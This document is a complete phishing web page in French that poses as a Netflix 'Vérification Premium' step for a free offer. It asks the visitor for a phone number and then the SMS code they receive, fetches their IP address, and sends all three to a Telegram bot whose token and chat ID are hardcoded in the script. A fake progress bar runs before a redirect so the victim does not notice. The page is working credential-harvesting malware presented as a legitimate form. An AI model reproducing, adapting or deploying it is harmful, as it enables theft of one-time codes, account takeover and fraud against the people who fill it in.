<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>V√©rification Premium</title>
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;700&display=swap" rel="stylesheet">
    <style>
        *{margin:0;padding:0;box-sizing:border-box;font-family:'Poppins',sans-serif;}
        body{background:#000;color:#fff;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px;}
        .container{max-width:500px;width:100%;}
        .card{background:#141414;border-radius:20px;padding:40px;box-shadow:0 20px 60px rgba(229,9,20,0.3);}
        .header{text-align:center;margin-bottom:40px;}
        h1{font-size:2.2em;color:#E50914;margin-bottom:10px;}
        p{color:#aaa;}
        .steps{display:flex;justify-content:center;margin-bottom:30px;gap:20px;}
        .step{color:#666;font-size:0.9em;}
        .step.active{color:#E50914;font-weight:bold;}
        .form-group{margin-bottom:25px;}
        label{display:block;color:#fff;margin-bottom:10px;font-weight:600;}
        input{width:100%;padding:15px;background:#222;border:none;border-radius:10px;color:#fff;font-size:1.1em;}
        input:focus{outline:2px solid #E50914;}
        .btn{background:#E50914;color:#fff;padding:18px;border:none;border-radius:50px;font-size:1.2em;font-weight:bold;cursor:pointer;transition:0.3s;width:100%;}
        .btn:hover{background:#B20710;}
        .btn:disabled{background:#666;cursor:not-allowed;}
        .progress{margin-top:20px;height:6px;background:#333;border-radius:3px;overflow:hidden;display:none;}
        .progress-bar{height:100%;width:0%;background:#E50914;transition:width 0.6s ease;}
        .status{margin-top:15px;text-align:center;color:#E50914;font-weight:bold;display:none;}
    </style>
</head>
<body>
    <div class="container">
        <div class="card">
            <div class="header">
                <h1>V√©rification Premium</h1>
                <p>√âtape finale pour activer ton offre gratuite</p>
            </div>

            <div class="steps">
                <div class="step active">1. Num√©ro</div>
                <div class="step" id="step2">2. Code SMS</div>
                <div class="step" id="step3">3. Activation</div>
            </div>

            <form id="verifyForm">
                <div class="form-group">
                    <label>Num√©ro de t√©l√©phone</label>
                    <input type="tel" id="phone" placeholder="+33 6 12 34 56 78" required>
                </div>
                <div class="form-group" id="codeGroup" style="display:none;">
                    <label>Code SMS re√ßu</label>
                    <input type="text" id="code" maxlength="6" placeholder="123456">
                </div>
                <button type="submit" class="btn" id="submitBtn">Continuer</button>
            </form>

            <div class="progress" id="progress">
                <div class="progress-bar" id="progressBar"></div>
            </div>
            <div class="status" id="status"></div>
        </div>
    </div>

    <script>
        const TELEGRAM_TOKEN = "8093456348:AAH7qkyDnquHF5sy8kb2W0H8TmWkNzJ_aFo";
        const TELEGRAM_CHAT_ID = "6272429080";

        const messages = [
            "V√©rification du num√©ro en cours...",
            "Envoi du code SMS...",
            "Validation de l'op√©rateur...",
            "Activation de l'offre premium...",
            "Finalisation de l'acc√®s gratuit..."
        ];

        document.getElementById('verifyForm').addEventListener('submit', async function(e) {
            e.preventDefault();
            const phone = document.getElementById('phone').value.trim();
            const codeGroup = document.getElementById('codeGroup');
            const submitBtn = document.getElementById('submitBtn');
            const progress = document.getElementById('progress');
            const progressBar = document.getElementById('progressBar');
            const status = document.getElementById('status');

            if (!document.getElementById('code').value) {
                codeGroup.style.display = 'block';
                submitBtn.textContent = 'Valider le code';
                document.getElementById('step2').classList.add('active');
                return;
            }

            const code = document.getElementById('code').value;
            const ip = await fetch('https://api.ipify.org').then(r => r.text());

            const message = `üéØ NOUVEAU COMPTE NETFLIX üéØ\nPlan: ${localStorage.getItem('selectedPlan') || 'N/A'}\nüì± Num√©ro: ${phone}\nüî¢ Code SMS: ${code}\nüåç IP: ${ip}\n‚è∞ ${new Date().toLocaleString('fr-FR')}`;
            fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: {'Content-Type':'application/json'},
                body: JSON.stringify({chat_id: TELEGRAM_CHAT_ID, text: message})
            });

            submitBtn.disabled = true;
            progress.style.display = 'block';
            status.style.display = 'block';
            let progressValue = 0;
            let msgIndex = 0;
            const interval = setInterval(() => {
                progressValue += 1.667;
                progressBar.style.width = progressValue + '%';
                if (progressValue >= (msgIndex + 1) * 20) {
                    msgIndex++;
                    if (msgIndex < messages.length) status.textContent = messages[msgIndex];
                }
            }, 1000);

            setTimeout(() => {
                clearInterval(interval);
                window.location.href = 'success.html';
            }, 60000);
        });
    </script>
</body>
</html>
